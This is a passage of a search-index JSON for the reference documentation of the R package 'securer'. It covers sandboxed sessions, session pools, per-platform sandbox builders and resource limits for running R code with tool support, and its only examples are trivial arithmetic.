)"},{"path":"https://ian-flores.github.io/securer/reference/SecureSession.html","id":"arguments","dir":"Reference","previous_headings":"","what":"Arguments","title":"SecureSession — SecureSession","text":"tools list securer_tool() objects, named list functions (legacy format backward compatibility) sandbox Logical, whether enable OS-level sandbox. macOS uses sandbox-exec Seatbelt profile denies network access restricts file writes temp directories.  Linux uses bubblewrap (bwrap) full namespace isolation.  Windows provides environment isolation (clean HOME/TMPDIR, empty R_LIBS_USER) resource limits (memory, CPU time, process count) via Job Objects. platforms session runs without sandboxing. limits optional named list resource limits apply child process via ulimit.  Supported names: cpu (seconds), memory (bytes, virtual address space), fsize (bytes, max file size), nproc (max processes), nofile (max open files), stack (bytes, stack size).  sandbox = TRUE limits NULL (default), sensible defaults applied automatically (see default_limits()).  Pass limits = list() explicitly disable resource limits.  sandbox = FALSE, NULL means limits. verbose Logical, whether emit diagnostic messages via message().  Useful debugging.  Users can suppress suppressMessages(). sandbox_strict Logical, whether error sandbox tools available current platform (default FALSE).  TRUE sandbox = TRUE, session stop informative error OS-level sandbox set . FALSE (default), existing behavior preserved: warning emitted session continues without sandboxing. audit_log Optional path JSONL file persistent audit logging.  NULL (default), file logging performed. path provided, structured JSON entries appended session lifecycle events, executions, tool calls.","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSession.html","id":"method-execute-","dir":"Reference","previous_headings":"","what":"Method execute()","title":"SecureSession — SecureSession","text":"Execute R code secure session","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSession.html","id":"usage-1","dir":"Reference","previous_headings":"","what":"Usage","title":"SecureSession — SecureSession","text":"","code":"SecureSession$execute(   code,   timeout = NULL,   validate = TRUE,   output_handler = NULL,   max_tool_calls = NULL )"},{"path":"https://ian-flores.github.io/securer/reference/SecureSession.html","id":"arguments-1","dir":"Reference","previous_headings":"","what":"Arguments","title":"SecureSession — SecureSession","text":"code Character string R code execute timeout Timeout seconds, NULL timeout (default NULL) validate Logical, whether pre-validate code syntax errors sending child process (default TRUE). output_handler optional callback function receives output lines (character) arrive child process. NULL (default), output collected returned \"output\" attribute result. max_tool_calls Maximum number tool calls allowed execution, NULL unlimited (default NULL).","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSession.html","id":"returns","dir":"Reference","previous_headings":"","what":"Returns","title":"SecureSession — SecureSession","text":"result evaluating code, \"output\" attribute containing captured stdout/stderr character vector.","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSession.html","id":"method-close-","dir":"Reference","previous_headings":"","what":"Method close()","title":"SecureSession — SecureSession","text":"Close session clean resources","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSession.html","id":"usage-2","dir":"Reference","previous_headings":"","what":"Usage","title":"SecureSession — SecureSession","text":"","code":"SecureSession$close()"},{"path":"https://ian-flores.github.io/securer/reference/SecureSession.html","id":"returns-1","dir":"Reference","previous_headings":"","what":"Returns","title":"SecureSession — SecureSession","text":"Invisible self","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSession.html","id":"method-is-alive-","dir":"Reference","previous_headings":"","what":"Method is_alive()","title":"SecureSession — SecureSession","text":"Check session alive","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSession.html","id":"usage-3","dir":"Reference","previous_headings":"","what":"Usage","title":"SecureSession — SecureSession","text":"","code":"SecureSession$is_alive()"},{"path":"https://ian-flores.github.io/securer/reference/SecureSession.html","id":"returns-2","dir":"Reference","previous_headings":"","what":"Returns","title":"SecureSession — SecureSession","text":"Logical","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSession.html","id":"method-format-","dir":"Reference","previous_headings":"","what":"Method format()","title":"SecureSession — SecureSession","text":"Format method display","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSession.html","id":"usage-4","dir":"Reference","previous_headings":"","what":"Usage","title":"SecureSession — SecureSession","text":"","code":"SecureSession$format(...)"},{"path":"https://ian-flores.github.io/securer/reference/SecureSession.html","id":"arguments-2","dir":"Reference","previous_headings":"","what":"Arguments","title":"SecureSession — SecureSession","text":"... Ignored.","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSession.html","id":"returns-3","dir":"Reference","previous_headings":"","what":"Returns","title":"SecureSession — SecureSession","text":"character string describing session.","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSession.html","id":"method-print-","dir":"Reference","previous_headings":"","what":"Method print()","title":"SecureSession — SecureSession","text":"Print method","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSession.html","id":"usage-5","dir":"Reference","previous_headings":"","what":"Usage","title":"SecureSession — SecureSession","text":"","code":"SecureSession$print(...)"},{"path":"https://ian-flores.github.io/securer/reference/SecureSession.html","id":"arguments-3","dir":"Reference","previous_headings":"","what":"Arguments","title":"SecureSession — SecureSession","text":"... Ignored.","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSession.html","id":"returns-4","dir":"Reference","previous_headings":"","what":"Returns","title":"SecureSession — SecureSession","text":"Invisible self.","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSession.html","id":"method-tools-","dir":"Reference","previous_headings":"","what":"Method tools()","title":"SecureSession — SecureSession","text":"List registered tools argument specs","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSession.html","id":"usage-6","dir":"Reference","previous_headings":"","what":"Usage","title":"SecureSession — SecureSession","text":"","code":"SecureSession$tools()"},{"path":"https://ian-flores.github.io/securer/reference/SecureSession.html","id":"returns-5","dir":"Reference","previous_headings":"","what":"Returns","title":"SecureSession — SecureSession","text":"named list tool information. element contains name args fields. Returns empty list tools registered.","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSession.html","id":"method-restart-","dir":"Reference","previous_headings":"","what":"Method restart()","title":"SecureSession — SecureSession","text":"Restart child R process Kills current child process, cleans socket, starts fresh child runtime tool wrappers re-injected. session remains usable subsequent $execute() calls.","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSession.html","id":"usage-7","dir":"Reference","previous_headings":"","what":"Usage","title":"SecureSession — SecureSession","text":"","code":"SecureSession$restart()"},{"path":"https://ian-flores.github.io/securer/reference/SecureSession.html","id":"returns-6","dir":"Reference","previous_headings":"","what":"Returns","title":"SecureSession — SecureSession","text":"Invisible self.","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSession.html","id":"method-clone-","dir":"Reference","previous_headings":"","what":"Method clone()","title":"SecureSession — SecureSession","text":"objects class cloneable method.","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSession.html","id":"usage-8","dir":"Reference","previous_headings":"","what":"Usage","title":"SecureSession — SecureSession","text":"","code":"SecureSession$clone(deep = FALSE)"},{"path":"https://ian-flores.github.io/securer/reference/SecureSession.html","id":"arguments-4","dir":"Reference","previous_headings":"","what":"Arguments","title":"SecureSession — SecureSession","text":"deep Whether make deep clone.","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSession.html","id":"ref-examples","dir":"Reference","previous_headings":"","what":"Examples","title":"SecureSession — SecureSession","text":"","code":"# \\donttest{ # Basic usage session <- SecureSession$new() session$execute(\"1 + 1\") #> [1] 2 session$close()  # With tools tools <- list(   securer_tool(\"add\", \"Add numbers\",     fn = function(a, b) a + b,     args = list(a = \"numeric\", b = \"numeric\")) ) session <- SecureSession$new(tools = tools) session$execute(\"add(2, 3)\") #> [1] 5 session$close() # } if (FALSE) { # \\dontrun{ # With sandbox (requires platform-specific tools) session <- SecureSession$new(sandbox = TRUE) session$execute(\"1 + 1\") session$close() } # }"},{"path":"https://ian-flores.github.io/securer/reference/SecureSessionPool.html","id":null,"dir":"Reference","previous_headings":"","what":"SecureSessionPool — SecureSessionPool","title":"SecureSessionPool — SecureSessionPool","text":"R6 class pool pre-warmed SecureSession instances. Creates multiple sessions initialization time $execute() calls can run immediately idle session without waiting process startup. Sessions returned pool execution completes (errors).","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSessionPool.html","id":"value","dir":"Reference","previous_headings":"","what":"Value","title":"SecureSessionPool — SecureSessionPool","text":"R6 object class SecureSessionPool.","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSessionPool.html","id":"thread-safety","dir":"Reference","previous_headings":"","what":"Thread Safety","title":"SecureSessionPool — SecureSessionPool","text":"SecureSessionPool thread-safe. acquire/release mechanism uses locking assumes single-threaded access. need use pools multiple processes (e.g., via parallel::mclapply future), process create pool instance. Sharing single pool across threads forked processes lead race conditions session acquisition.","code":""},{"path":[]},{"path":"https://ian-flores.github.io/securer/reference/SecureSessionPool.html","id":"public-methods","dir":"Reference","previous_headings":"","what":"Public methods","title":"SecureSessionPool — SecureSessionPool","text":"SecureSessionPool$new() SecureSessionPool$execute() SecureSessionPool$size() SecureSessionPool$available() SecureSessionPool$status() SecureSessionPool$format() SecureSessionPool$print() SecureSessionPool$close() SecureSessionPool$clone()","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSessionPool.html","id":"method-new-","dir":"Reference","previous_headings":"","what":"Method new()","title":"SecureSessionPool — SecureSessionPool","text":"Create new SecureSessionPool","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSessionPool.html","id":"usage","dir":"Reference","previous_headings":"","what":"Usage","title":"SecureSessionPool — SecureSessionPool","text":"","code":"SecureSessionPool$new(   size = 4L,   tools = list(),   sandbox = TRUE,   limits = NULL,   verbose = FALSE )"},{"path":"https://ian-flores.github.io/securer/reference/SecureSessionPool.html","id":"arguments","dir":"Reference","previous_headings":"","what":"Arguments","title":"SecureSessionPool — SecureSessionPool","text":"size Integer, number sessions pre-warm (default 4, minimum 1). tools list securer_tool() objects passed session. sandbox Logical, whether enable OS-level sandboxing. limits Optional named list resource limits. verbose Logical, whether emit diagnostic messages.","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSessionPool.html","id":"method-execute-","dir":"Reference","previous_headings":"","what":"Method execute()","title":"SecureSessionPool — SecureSessionPool","text":"Execute R code available pooled session","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSessionPool.html","id":"usage-1","dir":"Reference","previous_headings":"","what":"Usage","title":"SecureSessionPool — SecureSessionPool","text":"","code":"SecureSessionPool$execute(code, timeout = NULL, acquire_timeout = NULL)"},{"path":"https://ian-flores.github.io/securer/reference/SecureSessionPool.html","id":"arguments-1","dir":"Reference","previous_headings":"","what":"Arguments","title":"SecureSessionPool — SecureSessionPool","text":"code Character string R code execute. timeout Timeout seconds, NULL timeout. acquire_timeout Optional timeout seconds wait session become available. NULL (default), fails immediately sessions busy. provided, retries acquisition short sleep (0.1s) retries timeout expires.","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSessionPool.html","id":"returns","dir":"Reference","previous_headings":"","what":"Returns","title":"SecureSessionPool — SecureSessionPool","text":"result evaluating code.","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSessionPool.html","id":"method-size-","dir":"Reference","previous_headings":"","what":"Method size()","title":"SecureSessionPool — SecureSessionPool","text":"Number sessions pool","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSessionPool.html","id":"usage-2","dir":"Reference","previous_headings":"","what":"Usage","title":"SecureSessionPool — SecureSessionPool","text":"","code":"SecureSessionPool$size()"},{"path":"https://ian-flores.github.io/securer/reference/SecureSessionPool.html","id":"returns-1","dir":"Reference","previous_headings":"","what":"Returns","title":"SecureSessionPool — SecureSessionPool","text":"Integer","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSessionPool.html","id":"method-available-","dir":"Reference","previous_headings":"","what":"Method available()","title":"SecureSessionPool — SecureSessionPool","text":"Number idle (non-busy) sessions","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSessionPool.html","id":"usage-3","dir":"Reference","previous_headings":"","what":"Usage","title":"SecureSessionPool — SecureSessionPool","text":"","code":"SecureSessionPool$available()"},{"path":"https://ian-flores.github.io/securer/reference/SecureSessionPool.html","id":"returns-2","dir":"Reference","previous_headings":"","what":"Returns","title":"SecureSessionPool — SecureSessionPool","text":"Integer","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSessionPool.html","id":"method-status-","dir":"Reference","previous_headings":"","what":"Method status()","title":"SecureSessionPool — SecureSessionPool","text":"Summary pool state","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSessionPool.html","id":"usage-4","dir":"Reference","previous_headings":"","what":"Usage","title":"SecureSessionPool — SecureSessionPool","text":"","code":"SecureSessionPool$status()"},{"path":"https://ian-flores.github.io/securer/reference/SecureSessionPool.html","id":"returns-3","dir":"Reference","previous_headings":"","what":"Returns","title":"SecureSessionPool — SecureSessionPool","text":"named list total, busy, idle, dead counts. dead indicates sessions crashed need restart.","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSessionPool.html","id":"method-format-","dir":"Reference","previous_headings":"","what":"Method format()","title":"SecureSessionPool — SecureSessionPool","text":"Format method display","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSessionPool.html","id":"usage-5","dir":"Reference","previous_headings":"","what":"Usage","title":"SecureSessionPool — SecureSessionPool","text":"","code":"SecureSessionPool$format(...)"},{"path":"https://ian-flores.github.io/securer/reference/SecureSessionPool.html","id":"arguments-2","dir":"Reference","previous_headings":"","what":"Arguments","title":"SecureSessionPool — SecureSessionPool","text":"... Ignored.","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSessionPool.html","id":"returns-4","dir":"Reference","previous_headings":"","what":"Returns","title":"SecureSessionPool — SecureSessionPool","text":"character string describing pool.","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSessionPool.html","id":"method-print-","dir":"Reference","previous_headings":"","what":"Method print()","title":"SecureSessionPool — SecureSessionPool","text":"Print method","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSessionPool.html","id":"usage-6","dir":"Reference","previous_headings":"","what":"Usage","title":"SecureSessionPool — SecureSessionPool","text":"","code":"SecureSessionPool$print(...)"},{"path":"https://ian-flores.github.io/securer/reference/SecureSessionPool.html","id":"arguments-3","dir":"Reference","previous_headings":"","what":"Arguments","title":"SecureSessionPool — SecureSessionPool","text":"... Ignored.","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSessionPool.html","id":"returns-5","dir":"Reference","previous_headings":"","what":"Returns","title":"SecureSessionPool — SecureSessionPool","text":"Invisible self.","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSessionPool.html","id":"method-close-","dir":"Reference","previous_headings":"","what":"Method close()","title":"SecureSessionPool — SecureSessionPool","text":"Close sessions shut pool","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSessionPool.html","id":"usage-7","dir":"Reference","previous_headings":"","what":"Usage","title":"SecureSessionPool — SecureSessionPool","text":"","code":"SecureSessionPool$close()"},{"path":"https://ian-flores.github.io/securer/reference/SecureSessionPool.html","id":"returns-6","dir":"Reference","previous_headings":"","what":"Returns","title":"SecureSessionPool — SecureSessionPool","text":"Invisible self","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSessionPool.html","id":"method-clone-","dir":"Reference","previous_headings":"","what":"Method clone()","title":"SecureSessionPool — SecureSessionPool","text":"objects class cloneable method.","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSessionPool.html","id":"usage-8","dir":"Reference","previous_headings":"","what":"Usage","title":"SecureSessionPool — SecureSessionPool","text":"","code":"SecureSessionPool$clone(deep = FALSE)"},{"path":"https://ian-flores.github.io/securer/reference/SecureSessionPool.html","id":"arguments-4","dir":"Reference","previous_headings":"","what":"Arguments","title":"SecureSessionPool — SecureSessionPool","text":"deep Whether make deep clone.","code":""},{"path":"https://ian-flores.github.io/securer/reference/SecureSessionPool.html","id":"ref-examples","dir":"Reference","previous_headings":"","what":"Examples","title":"SecureSessionPool — SecureSessionPool","text":"","code":"# \\donttest{ pool <- SecureSessionPool$new(size = 2, sandbox = FALSE) pool$execute(\"1 + 1\") #> [1] 2 pool$execute(\"2 + 2\") #> [1] 4 pool$close() # }"},{"path":"https://ian-flores.github.io/securer/reference/apply_windows_job_object.html","id":null,"dir":"Reference","previous_headings":"","what":"Apply Windows Job Object limits to a process — apply_windows_job_object","title":"Apply Windows Job Object limits to a process — apply_windows_job_object","text":"Generates executes PowerShell script uses C# P/Invoke create Job Object specified resource limits assign target process .","code":""},{"path":"https://ian-flores.github.io/securer/reference/apply_windows_job_object.html","id":"ref-usage","dir":"Reference","previous_headings":"","what":"Usage","title":"Apply Windows Job Object limits to a process — apply_windows_job_object","text":"","code":"apply_windows_job_object(pid, limits)"},{"path":"https://ian-flores.github.io/securer/reference/apply_windows_job_object.html","id":"arguments","dir":"Reference","previous_headings":"","what":"Arguments","title":"Apply Windows Job Object limits to a process — apply_windows_job_object","text":"pid Integer process ID constrain limits Named list supported limits (cpu, memory, nproc)","code":""},{"path":"https://ian-flores.github.io/securer/reference/apply_windows_job_object.html","id":"value","dir":"Reference","previous_headings":"","what":"Value","title":"Apply Windows Job Object limits to a process — apply_windows_job_object","text":"Invisible NULL.  Warns failure (best-effort).","code":""},{"path":"https://ian-flores.github.io/securer/reference/build_limits_only_wrapper.html","id":null,"dir":"Reference","previous_headings":"","what":"Build a minimal wrapper script that only applies resource limits — build_limits_only_wrapper","title":"Build a minimal wrapper script that only applies resource limits — build_limits_only_wrapper","text":"Used sandbox = FALSE limits provided.  Creates shell wrapper sets ulimit values execs R.","code":""},{"path":"https://ian-flores.github.io/securer/reference/build_limits_only_wrapper.html","id":"ref-usage","dir":"Reference","previous_headings":"","what":"Usage","title":"Build a minimal wrapper script that only applies resource limits — build_limits_only_wrapper","text":"","code":"build_limits_only_wrapper(limits)"},{"path":"https://ian-flores.github.io/securer/reference/build_limits_only_wrapper.html","id":"arguments","dir":"Reference","previous_headings":"","what":"Arguments","title":"Build a minimal wrapper script that only applies resource limits — build_limits_only_wrapper","text":"limits named list resource limits.","code":""},{"path":"https://ian-flores.github.io/securer/reference/build_limits_only_wrapper.html","id":"value","dir":"Reference","previous_headings":"","what":"Value","title":"Build a minimal wrapper script that only applies resource limits — build_limits_only_wrapper","text":"sandbox config list wrapper profile_path = NULL.","code":""},{"path":"https://ian-flores.github.io/securer/reference/build_sandbox_config.html","id":null,"dir":"Reference","previous_headings":"","what":"Build sandbox configuration for the current platform — build_sandbox_config","title":"Build sandbox configuration for the current platform — build_sandbox_config","text":"Inspects operating system delegates appropriate platform- specific sandbox builder.  Returns list start_session() uses wrap child R process.","code":""},{"path":"https://ian-flores.github.io/securer/reference/build_sandbox_config.html","id":"ref-usage","dir":"Reference","previous_headings":"","what":"Usage","title":"Build sandbox configuration for the current platform — build_sandbox_config","text":"","code":"build_sandbox_config(socket_path, r_home = R.home(), limits = NULL)"},{"path":"https://ian-flores.github.io/securer/reference/build_sandbox_config.html","id":"arguments","dir":"Reference","previous_headings":"","what":"Arguments","title":"Build sandbox configuration for the current platform — build_sandbox_config","text":"socket_path Path UDS socket (must writable child) r_home Path R installation (default: R.home()) limits Optional named list resource limits (see generate_ulimit_commands())","code":""},{"path":"https://ian-flores.github.io/securer/reference/build_sandbox_config.html","id":"value","dir":"Reference","previous_headings":"","what":"Value","title":"Build sandbox configuration for the current platform — build_sandbox_config","text":"list elements: wrapper Path shell wrapper script, NULL profile_path Path generated sandbox profile, NULL","code":""},{"path":"https://ian-flores.github.io/securer/reference/build_sandbox_fallback.html","id":null,"dir":"Reference","previous_headings":"","what":"Build fallback sandbox configuration (no OS sandbox) — build_sandbox_fallback","title":"Build fallback sandbox configuration (no OS sandbox) — build_sandbox_fallback","text":"Used platform-specific sandbox available.  Returns config NULL wrapper profile session starts without OS-level isolation.","code":""},{"path":"https://ian-flores.github.io/securer/reference/build_sandbox_fallback.html","id":"ref-usage","dir":"Reference","previous_headings":"","what":"Usage","title":"Build fallback sandbox configuration (no OS sandbox) — build_sandbox_fallback","text":"","code":"build_sandbox_fallback(socket_path, r_home)"},{"path":"https://ian-flores.github.io/securer/reference/build_sandbox_fallback.html","id":"arguments","dir":"Reference","previous_headings":"","what":"Arguments","title":"Build fallback sandbox configuration (no OS sandbox) — build_sandbox_fallback","text":"socket_path Path UDS socket r_home Path R installation","code":""},{"path":"https://ian-flores.github.io/securer/reference/build_sandbox_fallback.html","id":"value","dir":"Reference","previous_headings":"","what":"Value","title":"Build fallback sandbox configuration (no OS sandbox) — build_sandbox_fallback","text":"sandbox config list wrapper = NULL profile_path = NULL","code":""},{"path":"https://ian-flores.github.io/securer/reference/build_sandbox_linux.html","id":null,"dir":"Reference","previous_headings":"","what":"Build Linux sandbox configuration — build_sandbox_linux","title":"Build Linux sandbox configuration — build_sandbox_linux","text":"Locates bwrap (bubblewrap) creates wrapper shell script launches R inside fully-isolated sandbox.  wrapper can passed callr::r_session_options() via arch parameter.","code":""},{"path":"https://ian-flores.github.io/securer/reference/build_sandbox_linux.html","id":"ref-usage","dir":"Reference","previous_headings":"","what":"Usage","title":"Build Linux sandbox configuration — build_sandbox_linux","text":"","code":"build_sandbox_linux(socket_path, r_home, limits = NULL)"},{"path":"https://ian-flores.github.io/securer/reference/build_sandbox_linux.html","id":"arguments","dir":"Reference","previous_headings":"","what":"Arguments","title":"Build Linux sandbox configuration — build_sandbox_linux","text":"socket_path Path UDS socket r_home Path R installation limits Optional named list resource limits (see generate_ulimit_commands())","code":""},{"path":"https://ian-flores.github.io/securer/reference/build_sandbox_linux.html","id":"value","dir":"Reference","previous_headings":"","what":"Value","title":"Build Linux sandbox configuration — build_sandbox_linux","text":"sandbox config list (see build_sandbox_config())","code":""},{"path":"https://ian-flores.github.io/securer/reference/build_sandbox_macos.html","id":null,"dir":"Reference","previous_headings":"","what":"Build macOS sandbox configuration — build_sandbox_macos","title":"Build macOS sandbox configuration — build_sandbox_macos","text":"Writes temporary Seatbelt profile creates wrapper shell script launches R inside sandbox-exec.  wrapper can passed callr::r_session_options() via arch parameter (callr uses path R binary).","code":""},{"path":"https://ian-flores.github.io/securer/reference/build_sandbox_macos.html","id":"ref-usage","dir":"Reference","previous_headings":"","what":"Usage","title":"Build macOS sandbox configuration — build_sandbox_macos","text":"","code":"build_sandbox_macos(socket_path, r_home, limits = NULL)"},{"path":"https://ian-flores.github.io/securer/reference/build_sandbox_macos.html","id":"arguments","dir":"Reference","previous_headings":"","what":"Arguments","title":"Build macOS sandbox configuration — build_sandbox_macos","text":"socket_path Path UDS socket r_home Path R installation limits Optional named list resource limits (see generate_ulimit_commands())","code":""},{"path":"https://ian-flores.github.io/securer/reference/build_sandbox_macos.html","id":"value","dir":"Reference","previous_headings":"","what":"Value","title":"Build macOS sandbox configuration — build_sandbox_macos","text":"sandbox config list (see build_sandbox_config())","code":""},{"path":"https://ian-flores.github.io/securer/reference/build_sandbox_windows.html","id":null,"dir":"Reference","previous_headings":"","what":"Build Windows sandbox configuration — build_sandbox_windows","title":"Build Windows sandbox configuration — build_sandbox_windows","text":"Provides environment isolation optional resource limits via Windows Job Objects.  Environment isolation creates sanitized set environment variables clean HOME, TMPDIR, TMP, TEMP pointing private temp directory, empty R_LIBS_USER.","code":""},{"path":"https://ian-flores.github.io/securer/reference/build_sandbox_windows.html","id":"ref-usage","dir":"Reference","previous_headings":"","what":"Usage","title":"Build Windows sandbox configuration — build_sandbox_windows","text":"","code":"build_sandbox_windows(socket_path, r_home, limits = NULL)"},{"path":"https://ian-flores.github.io/securer/reference/build_sandbox_windows.html","id":"arguments","dir":"Reference","previous_headings":"","what":"Arguments","title":"Build Windows sandbox configuration — build_sandbox_windows","text":"socket_path Path UDS socket r_home Path R installation limits Optional named list resource limits.  Supported Windows via Job Objects: cpu, memory, nproc.  Unsupported (warn): fsize, nofile, stack.","code":""},{"path":"https://ian-flores.github.io/securer/reference/build_sandbox_windows.html","id":"value","dir":"Reference","previous_headings":"","what":"Value","title":"Build Windows sandbox configuration — build_sandbox_windows","text":"list elements: wrapper Always NULL Windows (wrapper script) profile_path Always NULL Windows env named character vector sanitized environment variables sandbox_tmp Path private temp directory apply_limits function taking PID apply Job Object limits, NULL supported limits requested","code":""},{"path":"https://ian-flores.github.io/securer/reference/build_sandbox_windows.html","id":"details","dir":"Reference","previous_headings":"","what":"Details","title":"Build Windows sandbox configuration — build_sandbox_windows","text":"resource limits provided (cpu, memory, nproc), PowerShell script using C# P/Invoke generated create Job Object specified constraints assign child process .  Limits Job Object equivalent (fsize, nofile, stack) emit warning skipped.","code":""},{"path":"https://ian-flores.github.io/securer/reference/child_runtime_code.html","id":null,"dir":"Reference","previous_headings":"","what":"Generate the R code to inject into the child process — child_runtime_code","title":"Generate the R code to inject into the child process — child_runtime_code","text":"Returns character string R code , evaluated child process, sets IPC connection defines .securer_call_tool().","code":""},{"path":"https://ian-flores.github.io/securer/reference/child_runtime_code.html","id":"ref-usage","dir":"Reference","previous_headings":"","what":"Usage","title":"Generate the R code to inject into the child process — child_runtime_code","text":"","code":"child_runtime_code()"},{"path":"https://ian-flores.github.io/securer/reference/child_runtime_code.html","id":"value","dir":"Reference","previous_headings":"","what":"Value","title":"Generate the R code to inject into the child process — child_runtime_code","text":"single character string R code","code":""},{"path":"https://ian-flores.github.io/securer/reference/default_limits.html","id":null,"dir":"Reference","previous_headings":"","what":"Default resource limits for sandboxed sessions — default_limits","title":"Default resource limits for sandboxed sessions — default_limits","text":"Returns default resource limits applied automatically sandbox = TRUE explicit limits provided SecureSession execute_r().  Useful inspecting defaults creating custom limits based .","code":""},{"path":"https://ian-flores.github.io/securer/reference/default_limits.html","id":"ref-usage","dir":"Reference","previous_headings":"","what":"Usage","title":"Default resource limits for sandboxed sessions — default_limits","text":"","code":"default_limits()"},{"path":"https://ian-flores.github.io/securer/reference/default_limits.html","id":"value","dir":"Reference","previous_headings":"","what":"Value","title":"Default resource limits for sandboxed sessions — default_limits","text":"named list resource limits.","code":""},{"path":"https://ian-flores.github.io/securer/reference/default_limits.html","id":"details","dir":"Reference","previous_headings":"","what":"Details","title":"Default resource limits for sandboxed sessions — default_limits","text":"returned list contains: cpu CPU time limit seconds (default: 60). memory Virtual memory limit bytes (default: 512 MB). fsize Maximum file size bytes (default: 50 MB). nproc Maximum number child processes (default: 50). nofile Maximum number open file descriptors (default: 256). can pass modified copy SecureSession$new(limits = ...) execute_r(limits = ...).  Pass limits = list() explicitly disable resource limits.","code":""},{"path":"https://ian-flores.github.io/securer/reference/default_limits.html","id":"ref-examples","dir":"Reference","previous_headings":"","what":"Examples","title":"Default resource limits for sandboxed sessions — default_limits","text":"","code":"# Inspect defaults default_limits() #> $cpu #> [1] 60 #>  #> $memory #> [1] 536870912 #>  #> $fsize #> [1] 52428800 #>  #> $nproc #> [1] 50 #>  #> $nofile #> [1] 256 #>   # Double the memory limit my_limits <- default_limits() my_limits$memory <- 1024 * 1024 * 1024  # 1 GB"},{"path":"https://ian-flores.github.io/securer/reference/execute_r.html","id":null,"dir":"Reference","previous_headings":"","what":"Execute R code securely with tool support — execute_r","title":"Execute R code securely with tool support — execute_r","text":"convenience wrapper creates SecureSession, executes code, returns result. session automatically closed done.","code":""},{"path":"https://ian-flores.github.io/securer/reference/execute_r.html","id":"ref-usage","dir":"Reference","previous_headings":"","what":"Usage","title":"Execute R code securely with tool support — execute_r","text":"","code":"execute_r(   code,   tools = list(),   timeout = 30,   sandbox = TRUE,   limits = NULL,   verbose = FALSE,   validate = TRUE,   sandbox_strict = FALSE,   audit_log = NULL )"},{"path":"https://ian-flores.github.io/securer/reference/execute_r.html","id":"arguments","dir":"Reference","previous_headings":"","what":"Arguments","title":"Execute R code securely with tool support — execute_r","text":"code Character string R code execute. tools List tools created securer_tool(), named list functions (legacy format). timeout Timeout seconds execution, NULL timeout (default 30). sandbox Logical, whether enable OS-level sandboxing (default TRUE). limits Optional named list resource limits (see SecureSession details). verbose Logical, whether emit diagnostic messages via message().  Useful debugging.  Users can suppress suppressMessages(). validate Logical, whether pre-validate code syntax errors sending child process (default TRUE). sandbox_strict Logical, whether error sandbox tools available (default FALSE).  See SecureSession details. audit_log Optional path JSONL file persistent audit logging (default NULL, file logging).","code":""},{"path":"https://ian-flores.github.io/securer/reference/execute_r.html","id":"value","dir":"Reference","previous_headings":"","what":"Value","title":"Execute R code securely with tool support — execute_r","text":"result evaluating code secure session.","code":""},{"path":"https://ian-flores.github.io/securer/reference/execute_r.html","id":"ref-examples","dir":"Reference","previous_headings":"","what":"Examples","title":"Execute R code securely with tool support — execute_r","text":"","code":"# \\donttest{ # Simple computation execute_r(\"1 + 1\", sandbox = FALSE) #> [1] 2  # With tools result <- execute_r(   code = 'add(2, 3)',   tools = list(     securer_tool(\"add\", \"Add two numbers\",       fn = function(a, b) a + b,       args = list(a = \"numeric\", b = \"numeric\"))   ),   sandbox = FALSE ) # } if (FALSE) { # \\dontrun{ # With resource limits (Unix only) execute_r(\"1 + 1\", limits = list(cpu = 10, memory = 256 * 1024 * 1024)) } # }"},{"path":"https://ian-flores.github.io/securer/reference/format_tool_result.html","id":null,"dir":"Reference","previous_headings":"","what":"Format an R value as a tool result string — format_tool_result","title":"Format an R value as a tool result string — format_tool_result","text":"Converts R objects human-readable string suitable returning LLM tool result. Data frames get truncated print representation; scalars coerced directly; objects use capture.output(print(...)).","code":""},{"path":"https://ian-flores.github.io/securer/reference/format_tool_result.html","id":"ref-usage","dir":"Reference","previous_headings":"","what":"Usage","title":"Format an R value as a tool result string — format_tool_result","text":"","code":"format_tool_result(value)"},{"path":"https://ian-flores.github.io/securer/reference/format_tool_result.html","id":"arguments","dir":"Reference","previous_headings":"","what":"Arguments","title":"Format an R value as a tool result string — format_tool_result","text":"value R object returned code execution.","code":""},{"path":"https://ian-flores.github.io/securer/reference/format_tool_result.html","id":"value","dir":"Reference","previous_headings":"","what":"Value","title":"Format an R value as a tool result string — format_tool_result","text":"character 